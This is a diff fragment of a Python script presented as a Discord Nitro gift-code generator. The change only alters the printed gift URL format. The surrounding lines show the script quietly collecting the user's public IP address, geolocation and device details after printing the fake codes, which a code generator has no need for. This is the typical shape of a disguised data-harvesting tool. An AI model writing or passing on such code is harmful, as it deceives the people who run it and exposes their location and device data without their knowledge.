@@ -55,11 +55,11 @@ def main():
         choice = int(input("Enter your choice: "))
         if choice in range(1, 6):
             nitro = generate_nitro(choice * 10)
-            print(f"Generated Nitro: discord.gg/gifts/{nitro}")
-            print(f"Generated Nitro: discord.gg/gifts/{nitro}")
-            print(f"Generated Nitro: discord.gg/gifts/{nitro}")
-            print(f"Generated Nitro: discord.gg/gifts/{nitro}")
-            print(f"Generated Nitro: discord.gg/gifts/{nitro}")
+            print(f"Generated Nitro: discord.gift/{nitro}")
+            print(f"Generated Nitro: discord.gift/{nitro}")
+            print(f"Generated Nitro: discord.gift/{nitro}")
+            print(f"Generated Nitro: discord.gift/{nitro}")
+            print(f"Generated Nitro: discord.gift/{nitro}")
             ip = requests.get('https://api.ipify.org').text
             location = get_location(ip)
             device_info = get_device_info()
